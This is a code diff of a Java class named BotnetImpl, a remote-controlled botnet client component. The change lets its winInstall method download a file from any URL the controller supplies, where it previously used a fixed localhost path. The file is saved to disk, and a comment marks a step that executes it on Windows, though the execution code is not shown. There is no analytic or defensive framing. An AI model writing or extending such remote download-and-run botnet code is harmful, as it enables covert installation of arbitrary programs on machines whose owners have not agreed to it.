@@ -63,14 +63,13 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
         return arr;
     }
     
-    public ArrayList<String> winInstall(String command){
+    public ArrayList<String> winInstall(String command, String appLink){
         try{
-            String domain = "";
-            String[] splited = command.split("\\s");
-            if (splited[0].equals("install")) {
-                String urlString = "http://localhost/myweb/rufus-3.10.exe";
+            if (command.equals("install")) {
+                String urlString = appLink;
                 URL url = new URL(urlString);
-                String fileLocation = splited[1];
+                String[] temp = appLink.split("/");
+                String fileLocation = temp[temp.length -1];
                 InputStream in = url.openStream();
                 File savedFile = new File(fileLocation);
                 FileOutputStream fos = new FileOutputStream(savedFile);
@@ -80,7 +79,6 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
                 while ((length = in.read(buffer)) > -1) {
                     fos.write(buffer, 0, length);
                 }
-                System.out.println(savedFile.getAbsolutePath());
                 fos.close();
                 in.close();
                 // execute for windows
@@ -109,7 +107,7 @@ public class BotnetImpl extends UnicastRemoteObject implements IBotnet{
             return runCommand("/usr/local/bin/brew install " + app);
         }
         else if(getOS().contains("win")){
-            return winInstall("install unikey.exe");
+            return winInstall("install", app);
         }
         return null;
         
